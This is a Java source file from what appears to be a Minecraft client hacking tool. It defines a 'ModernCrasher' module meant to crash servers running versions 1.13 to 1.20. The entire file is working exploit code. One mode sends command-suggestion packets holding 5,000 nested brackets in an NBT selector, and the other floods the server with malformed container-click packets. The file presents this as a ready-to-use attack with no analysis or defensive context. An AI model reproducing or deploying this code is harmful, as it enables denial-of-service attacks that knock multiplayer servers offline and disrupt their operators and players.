package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;

import java.util.ArrayList;
import java.util.List;

public class ModernCrasher extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String mode = "TabNBT";

    public ModernCrasher() {
        super("ModernCrasher", "Crash server with 1.13-1.20 exploit", true);
    }

    @Override
    public String getArgsUsage() { return "<mode>"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"TabNBT", "Negative Button"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        msgHelper.sendMessage("&fSending &6" + mode + " &fexploit...", true);

        switch (mode) {
            case "TabNBT" -> {
                StringBuilder nbt = new StringBuilder("/msg @a[nbt={a:");
                for (int i = 0; i < 5000; i++) nbt.append("[");
                nbt.append("]}]");
                for (int i = 0; i < 5; i++) {
                    mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, nbt.toString()));
                }
            }
            case "Negative Button" -> {
                for (int i = 0; i < 30; i++) {
                    ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                        0, 0, -999, -1, ClickType.SWAP, new ItemStack(Items.AIR),
                        new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                    );
                    mc.getConnection().send(packet);
                }
            }
        }

        msgHelper.sendMessage("&aModernCrasher sent!", true);
        setEnabled(false);
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
